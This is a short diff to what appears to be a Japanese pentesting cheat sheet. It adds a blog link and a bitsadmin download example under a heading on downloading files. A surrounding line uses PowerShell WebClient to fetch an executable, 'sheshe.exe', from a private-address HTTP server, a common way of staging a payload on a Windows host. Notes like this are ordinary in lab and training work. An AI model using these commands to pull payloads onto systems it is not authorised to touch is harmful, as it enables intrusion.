@@ -7,6 +7,10 @@
 `.\filename`
 
 ### fileをDL
+https://binary-pulsar.hatenablog.jp/entry/2018/11/28/090000
+
+`bitsadmin /transfer download https://www.google.co.jp/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png %CD%\logo.png`
+
 `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/sheshe.exe','sheshe.exe')"`
 
 ### powershellでプロセス実行
